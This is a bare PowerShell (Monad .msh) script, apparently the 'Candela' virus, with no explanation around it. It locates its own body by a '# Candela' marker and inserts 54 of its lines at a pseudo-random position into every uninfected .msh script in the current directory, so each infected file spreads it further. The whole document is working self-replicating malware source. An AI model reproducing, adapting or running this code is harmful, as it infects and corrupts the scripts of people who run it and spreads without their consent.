$name_array=get-childitem *.msh
# Candela
foreach ($name in $name_array)
{
  $cont=get-content $name.Name
  for ($i=0; $i -lt $cont.Length; $i++)
  {
    if ($cont[$i] -eq "# Candela")
    {
      $my_name=$name.Name
      $my_position=$i-1
    }
  }
}

$all=get-childitem *.*
$rnd_num=0
for ($i=0; $i -lt $all.Length; $i++)
{
  $rnd_num+=$all[$i].Length
}

$vir_cont=get-content $my_name
foreach ($name in $name_array)
{
  $inf=0
  $cont=get-content $name.Name
  for ($i=0; $i -lt $cont.Length; $i++)
  {
    if ($cont[$i] -eq "# Candela")
    {
      $inf=1
    }
  }
  if ($inf -eq 0)
  {
    $position=$rnd_num%$cont.Length
    echo $cont[0] >$name.Name
    for ($i=1; $i -lt $position; $i++)
    {
      echo $cont[$i] >>$name.Name
    }

    for ($i=$my_position; $i -lt $my_position+54; $i++)
    {
      echo $vir_cont[$i] >>$name.Name
    }

    for ($i=$position; $i -lt $cont.Length; $i++)
    {
      echo $cont[$i] >>$name.Name
    }
  }
}